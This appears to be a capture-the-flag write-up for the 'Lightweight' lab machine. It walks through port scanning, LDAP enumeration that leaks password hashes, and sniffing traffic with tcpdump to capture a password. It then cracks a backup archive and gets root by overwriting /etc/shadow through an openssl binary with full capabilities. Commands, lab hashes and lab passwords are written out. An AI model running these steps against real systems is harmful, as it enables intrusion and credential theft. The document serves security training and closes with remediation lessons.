# Lightweight Writeup w/o Metasploit

![](https://miro.medium.com/max/595/1*Tt-BgOiUrZq8VIkwnJyMBg.png)

## Reconnaissance <a id="2972"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.119 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.119Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 14:32 EST
Nmap scan report for 10.10.10.119
Host is up (0.038s latency).
Not shown: 997 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldapNmap done: 1 IP address (1 host up) scanned in 6.53 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 14:33 EST
Nmap scan report for 10.10.10.119
Host is up (0.037s latency).PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent timeService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.74 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 14:33 EST
Warning: 10.10.10.119 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.119
Host is up (0.068s latency).
All 1000 scanned ports on 10.10.10.119 are open|filtered (866) or filtered (134)Nmap done: 1 IP address (1 host up) scanned in 129.16 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 14:35 EST
Initiating Parallel DNS resolution of 1 host. at 14:35
Completed Parallel DNS resolution of 1 host. at 14:35, 0.04s elapsed
Initiating SYN Stealth Scan at 14:35
....
Nmap scan report for 10.10.10.119
Host is up (0.037s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldapRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.16 seconds
           Raw packets sent: 130950 (5.762MB) | Rcvd: 266 (19.068KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                               
Running CVE scan on basic ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 14:39 EST
Nmap scan report for 10.10.10.119
Host is up (0.028s latency).PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
....
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.XService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.42 secondsRunning Vuln scan on basic ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 14:40 EST
Nmap scan report for 10.10.10.119
Host is up (0.033s latency).PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
....
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
....
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.35 seconds
```

**Note:** This scan generates a lot of results. I only show the results that contributed to rooting this machine.

We have three ports open.

* **Port 22:** running OpenSSH 7.4
* **Port 80:** running Apache httpd 2.4.6
* **Port 389:** running OpenLDAP 2.2.X — 2.3.X

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* The nmap scan leaks the domain name _lightweight.htb_. We’ll have to add it to our _/etc/hosts_ file.
* Gobuster and nikto scans error out after a few tries, which leads us to believe there is some kind of brute force protection mechanism enabled on the site.
* OpenLDAP is running on port 389. We’ll have to enumerate this service to see if it leaks usernames, passwords, etc.

## Enumeration <a id="8a0b"></a>

Add the domain name to the _/etc/hosts_ file.

```text
10.10.10.119    lightweight.htb
```

I always start off with enumerating HTTP.

**Port 80 HTTP**

Visit the web application in the browser.

![](https://miro.medium.com/max/1442/1*vUn1OEFDCk-_L9oQO_4d8A.png)

As we suspected, the site is protected against brute force attacks. This is why our gobuster and nikto scans erred out. The index page does link to three other pages: _info_, _status_ and _user_.

Visit the _info_ page.

![](https://miro.medium.com/max/1427/1*s97vqvkKXr-mlJD6wLuNEQ.png)

Visit the _user_ page.

![](https://miro.medium.com/max/1426/1*35irujvlu7v8RteG5rxXYA.png)

This page tells us that it created an SSH account for us with both the username and password being our IP address.

**Port 22 SSH**

Let’s use these credentials to log into our account.

```text
root@kali:~# ssh 10.10.14.12@10.10.10.119
10.10.14.12@10.10.10.119's password: 
[10.10.14.12@lightweight ~]$ whoami
10.10.14.12
```

We’re in. Let’s do some enumeration.

```text
[10.10.14.12@lightweight ~]$ cd /home/
[10.10.14.12@lightweight home]$ ls -la
total 0
drwxr-xr-x.  6 root        root         77 Jan 25 19:35 .
dr-xr-xr-x. 17 root        root        224 Jun 13  2018 ..
drwx------.  4 10.10.14.12 10.10.14.12  91 Jan 25 22:06 10.10.14.12
drwx------.  4 10.10.14.2  10.10.14.2   91 Nov 16  2018 10.10.14.2
drwx------.  4 ldapuser1   ldapuser1   181 Jun 15  2018 ldapuser1
drwx------.  4 ldapuser2   ldapuser2   197 Jun 21  2018 ldapuser2
```

There’s two ldapuser accounts in the home directory that we don’t have access to. The _user.txt_ flag is probably in one of them, so let’s move on to enumerating port 389 to see if we can get the passwords to these users.

**Port 389 LDAP**

Nmap has an NSE script that enumerates LDAP.

```text
root@kali:~/Desktop/htb/lightweight# locate ldap-search
/usr/share/nmap/scripts/ldap-search.nse
```

Let’s run the script on port 389.

```text
root@kali:~/Desktop/htb/lightweight# nmap -p 389 --script ldap-search 10.10.10.119
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-26 12:07 EST
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.043s latency).PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

The script found hashed passwords for both _ldapuser1_ and _ldapuser2_. Let’s save both hashes in a file called _hashes.txt_.

```text
$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
```

Then run John on the hashes.

```text
root@kali:~/Desktop/htb/lightweight# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

John identifies the hashes to be SHA512, so it’ll probably take a while to crack these hashes. In the meantime, let’s look for an alternative way to get access to these user accounts.

**Note:** The ****Extra Content __section at the end of this blog explains how to enumerate LDAP manually without having to use the NSE script.

## Initial Foothold <a id="0e62"></a>

Let’s go back to our SSH session and see if there are any security misconfigurations that allow us to escalate privileges to _ldapuser1_ or _ldapuser2_.

To do that, let’s transfer the LinEnum script from our attack machine to the target machine. In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the _/tmp_ directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We see an interesting result pop up.

```text
[+] Files with POSIX capabilities set:
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

The _tcpdump_ binary is assigned the _cap\_net\_admin_ and _cap\_net\_raw_ capabilities. We can also manually check that using the _getcap_ command.

```text
[10.10.14.12@lightweight home]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

If you’re not familiar with linux capabilities, here’s a [great article](https://linux-audit.com/linux-capabilities-101/) that explains the concept in detail. As described in the article:

> Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced and hence decreases the risk of exploitation.

In the above entry, _tcpdump_ is assigned two capabilities.

* _cap\_net\_admin_

```text
CAP_NET_ADMIN
Perform various network-related operations:
* interface configuration;
* administration of IP firewall, masquerading, and accounting;
* modify routing tables;
* bind to any address for transparent proxying;
* set type-of-service (TOS)
* clear driver statistics;
* set promiscuous mode;
* enabling multicasting;
* use setsockopt(2) to set the following socket options:
  SO_DEBUG, SO_MARK, SO_PRIORITY (for a priority outside the range 0      
  to 6), SO_RCVBUFFORCE, and SO_SNDBUFFORCE.
```

* _cap\_net\_raw_

```text
CAP_NET_RAW
* Use RAW and PACKET sockets;
* bind to any address for transparent proxying.
```

The “_+ep”_ at the end stands for adding the capability as _Effective_ and _Permitted_.

```text
e: Effective
This means the capability is “activated”.p: Permitted
This means the capability can be used/is allowed.
```

So we’re allowed to run _tcpdump_ on any network interface. This will allow us to dump the traffic and analyze it for any sensitive information.

Let’s run _tcpdump_ on all the interfaces of the target machine.

```text
ssh 10.10.14.12@10.10.10.119 /usr/sbin/tcpdump -i any -U -w - 'not port 22' > tcpdump.cap
```

* **-i any**: capture packets from all interfaces
* **-U:** packet buffered output
* **-w:** write the raw packets to _file_ rather than parsing and printing them out
* **not port 22:** exclude traffic from port 22

Now go back to the application and visit the _info_, _status_ and _user_ pages. We know that the _user_ page triggers something at the backend that creates user accounts, so we’re hoping that we intercept an ldap password from there.

Leave it running for some time, then view the intercepted traffic using wireshark.

```text
wireshark tcpdump.cap
```

We’re looking for entries that have the LDAP protocol.

![](https://miro.medium.com/max/1386/1*YvfeRqHzpnj59UrJlFjovg.png)

Click on the above highlighted entry.

![](https://miro.medium.com/max/913/1*swngpOauVm98seNcLv5Gqw.png)

We have a password for _ldapuser2_!

```text
8bc8251332abe1d7f105d3e53ad39ac2
```

Let’s change our user to _ldapuser2_ using the password we found.

```text
su - ldapuser2
```

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/604/1*tnK6bWuxqTBK8167uPNqLQ.png)

List the content of the home directory.

```text
[ldapuser2@lightweight ~]$ ls -la
total 1880                                                          
drwx------. 4 ldapuser2 ldapuser2     197 Jun 21  2018 .                 
drwxr-xr-x. 6 root      root           77 Jan 25 19:35 ..                
-rw-r--r--. 1 root      root         3411 Jun 14  2018 backup.7z
....
```

There’s a _backup.7z_ file. We need to decompress it. Check if _7z_ is installed on the target machine.

```text
[ldapuser2@lightweight ~]$ locate 7z
/home/ldapuser2/backup.7z
/usr/bin/7za
```

It’s not but 7za is. Let’s use that to extract the content of the compressed file.

```text
[ldapuser2@lightweight ~]$ 7za x backup.7z 
                                                                                                   
7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21                            
p7zip Version 16.02 (locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7401P 24-Core Processor                (800F12),ASM,AES-NI)                                                                                                           
                                                                                                                       
Scanning the drive for archives:                                                                                       
1 file, 3411 bytes (4 KiB)                                                                                             
                                                                                                                       
Extracting archive: backup.7z                                                                                          
--                                                                                                                     
Path = backup.7z                                                                                                                    
Type = 7z                                                                                                                           
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1Enter password (will not be echoed):
```

It requests a password. Let’s transfer it to our attack machine and run a password cracker on it.

```text
scp ldapuser2@10.10.10.119:backup.7z .
```

SCP doesn’t seem to work, so we’ll transfer it by first base64 encoding the file.

```text
[ldapuser2@lightweight ~]$ cat backup.7z | base64
```

Then taking the base64 encoded string and saving it in the file _backup.7z.base64_ on the attack machine. The base64 encoded string does contain a bunch of new lines, you can remove them in vi using the command “_:%s/\n/g_”.

Next, base64 decode the file and save it in _backup.7z_.

```text
cat backup.7z.base64 | base64 --decode > backup.7z
```

In order to crack the password with John, we first need to convert it to JtR format using the _7z2john_ script.

```text
root@kali:~/Desktop/htb/lightweight# locate 7z2john
/usr/share/doc/john/README.7z2john.md
/usr/share/john/7z2john.pl
```

If you’ve never used it before, you do have to install the following dependency.

```text
apt install libcompress-raw-lzma-perl
```

Now run the program on the compressed file and save it in the file _backup-john.txt_.

```text
/usr/share/john/7z2john.pl backup.7z > backup-john.txt
```

Then run John on the _backup-john.txt_ file.

```text
root@kali:~/Desktop/htb/lightweight# john --wordlist=/usr/share/wordlists/rockyou.txt backup-john.txt Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 12 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
delete           (?)
1g 0:00:01:22 DONE (2020-01-26 16:46) 0.01218g/s 25.35p/s 25.35c/s 25.35C/s slimshady..jonathan1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

It found the password to be “_delete_”. Let’s use that to decrypt the file.

```text
7z x backup.7z
```

Looking through the files, we find that the file _status.php_ contains the credentials for _ldapuser1_.

```text
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
$ldapconfig['host'] = 'lightweight.htb';
$ldapconfig['port'] = '389';
$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
```

This allows us to pivot to that user.

```text
su - ldapuser1
```

Enumerate the directories and files in the home directory.

```text
[ldapuser1@lightweight ~]$ ls -la
total 1496
drwx------. 4 ldapuser1 ldapuser1    181 Jun 15  2018 .
drwxr-xr-x. 6 root      root          77 Jan 25 19:35 ..
-rw-------. 1 ldapuser1 ldapuser1      0 Jun 21  2018 .bash_history
-rw-r--r--. 1 ldapuser1 ldapuser1     18 Apr 11  2018 .bash_logout
-rw-r--r--. 1 ldapuser1 ldapuser1    193 Apr 11  2018 .bash_profile
-rw-r--r--. 1 ldapuser1 ldapuser1    246 Jun 15  2018 .bashrc
drwxrwxr-x. 3 ldapuser1 ldapuser1     18 Jun 11  2018 .cache
-rw-rw-r--. 1 ldapuser1 ldapuser1   9714 Jun 15  2018 capture.pcap
drwxrwxr-x. 3 ldapuser1 ldapuser1     18 Jun 11  2018 .config
-rw-rw-r--. 1 ldapuser1 ldapuser1    646 Jun 15  2018 ldapTLS.php
-rwxr-xr-x. 1 ldapuser1 ldapuser1 555296 Jun 13  2018 openssl
-rwxr-xr-x. 1 ldapuser1 ldapuser1 942304 Jun 13  2018 tcpdump
```

That’s odd, the user has his own instance of _openssl_ in his home directory. We can’t run it with sudo or suid privileges, so let’s check if the binary is configured with any linux capabilities.

```text
[ldapuser1@lightweight ~]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl =ep
```

It’s assigned “_ep_” which means that this openssl binary has ALL the capabilities permitted \(p\) and effective \(e\). We can use this misconfiguration to escalate privileges to root.

## Privilege Escalation <a id="cb27"></a>

If you visit the openssl page on [gtfobins](https://gtfobins.github.io/gtfobins/openssl/), you’ll see that the binary can be used to upload, download, read and write files. Since this gives us the ability to read and modify any file on the system, we’ll escalate privileges by changing the root password in the _/etc/shadow_ file.

First, let’s verify that we can read the _/etc/shado_w file.

```text
[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -in "/etc/shadow"root:$6$eVOz8tJs$xpjymy5BFFeCIHq9a.BoKZeyPReKd7pwoXnxFNOa7TP5ltNmSDsiyuS/ZqTgAGNEbx5jyZpCnbf8xIJ0Po6N8.:17711:0:99999:7:::
bin:*:17632:0:99999:7:::
daemon:*:17632:0:99999:7:::
adm:*:17632:0:99999:7:::
lp:*:17632:0:99999:7:::
sync:*:17632:0:99999:7:::
....
```

Perfect! Let’s generate a hash of the password “_password_” that we’ll use for the root account.

```text
[ldapuser1@lightweight ~]$ openssl passwd -1
Password: 
Verifying - Password: 
$1$tPGe2ea2$6TWzZgmk7L2rMTBAgFu3I1
```

* **-1:** uses the MD5 based BSD password algorithm 1

Create a file _shadow_ and save the content of _/etc/shadow_ in it. Then change the root password to the hash we generated above.

```text
[ldapuser1@lightweight ~]$ cat shadow
root:$1$tPGe2ea2$6TWzZgmk7L2rMTBAgFu3I1:17711:0:99999:7:::
bin:*:17632:0:99999:7:::
daemon:*:17632:0:99999:7:::
adm:*:17632:0:99999:7:::
lp:*:17632:0:99999:7:::
sync:*:17632:0:99999:7:::
shutdown:*:17632:0:99999:7:::
halt:*:17632:0:99999:7:::
mail:*:17632:0:99999:7:::
.....
```

Replace the _/etc/shadow_ file with the _shadow_ file we just created.

```text
/home/ldapuser1/openssl enc -in shadow -out /etc/shadow
```

Confirm that the change was made.

```text
[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -in "/etc/shadow"
root:$1$tPGe2ea2$6TWzZgmk7L2rMTBAgFu3I1:17711:0:99999:7:::
bin:*:17632:0:99999:7:::
daemon:*:17632:0:99999:7:::
adm:*:17632:0:99999:7:::
lp:*:17632:0:99999:7:::
sync:*:17632:0:99999:7:::
shutdown:*:17632:0:99999:7:::
halt:*:17632:0:99999:7:::
mail:*:17632:0:99999:7:::
....
```

Perfect! Now we can su into root using our newly created password.

```text
[ldapuser1@lightweight ~]$ su -
Password: 
Last login: Tue Jan 28 02:52:09 GMT 2020 on pts/0
[root@lightweight ~]# whoami
root
```

Grab the root.txt flag.

![](https://miro.medium.com/max/599/1*tBVvUKmsqlLjSHw85v6SCg.png)

## Extra Content <a id="c4da"></a>

This section describes how to manually enumerate LDAP, on the off chance that the NSE script does not work.

To get the domain component \(dc\), run the following command,

```text
root@kali:~# ldapsearch -x -h 10.10.10.119 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
##
dn:
namingContexts: dc=lightweight,dc=htb# search result
search: 2
result: 0 Success# numResponses: 2
# numEntries: 1
```

* **-x:** Use simple authentication instead of SASL.
* **-h:** ldaphost
* **-s:** scope of search

Now that we have the dc values, we can use them to dump the information that the NSE script was outputting.

```text
ldapsearch -x -h 10.10.10.119 -s sub -b 'dc=lightweight,dc=htb'
```

* **-b:** search base

We get back the following information.

```text
# extended LDIF
#
# LDAPv3
# base <dc=lightweight,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
## lightweight.htb
dn: dc=lightweight,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: lightweight htb
dc: lightweight# Manager, lightweight.htb
dn: cn=Manager,dc=lightweight,dc=htb
objectClass: organizationalRole
cn: Manager
description: Directory Manager# People, lightweight.htb
dn: ou=People,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: People# Group, lightweight.htb
dn: ou=Group,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: Group# ldapuser1, People, lightweight.htb
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
cn: ldapuser1
sn: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/ldapuser1# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
cn: ldapuser2
sn: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/ldapuser2# ldapuser1, Group, lightweight.htb
dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser1
userPassword:: e2NyeXB0fXg=
gidNumber: 1000# ldapuser2, Group, lightweight.htb
dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser2
userPassword:: e2NyeXB0fXg=
gidNumber: 1001# search result
search: 2
result: 0 Success# numResponses: 9
# numEntries: 8
```

## Lessons Learned <a id="73a7"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Security misconfiguration of linux capabilities on tcpdump binary that allowed us to dump traffic on all network interfaces and intercept the password of _ldapuser2_. The administrator should have conformed to the principle of least privilege when setting permissions.

To escalate privileges we exploited three vulnerabilities.

1. Weak credentials on backup file. The home directory of _ldapuser2_ contained a backup file that was encrypted using a weak password. John the Ripper cracked the password in a matter of seconds, which gave us access to the content of the folder. The administrator should have used a strong password that is difficult to crack.
2. Hard coded credentials in backup folder. When we decrypted the backup file, we found cleartext credentials that allowed us to pivot to the account of _ldapuser1_. When possible, developers should not embed credentials in files and security awareness training should be given to developers on password management best practices.
3. Security misconfiguration of Linux capabilities on openssl binary that allowed us to modify the _/etc/shadow_ file and escalate our privileges to root. Again, the administrator should have conformed to the principle of least privilege when setting permissions.

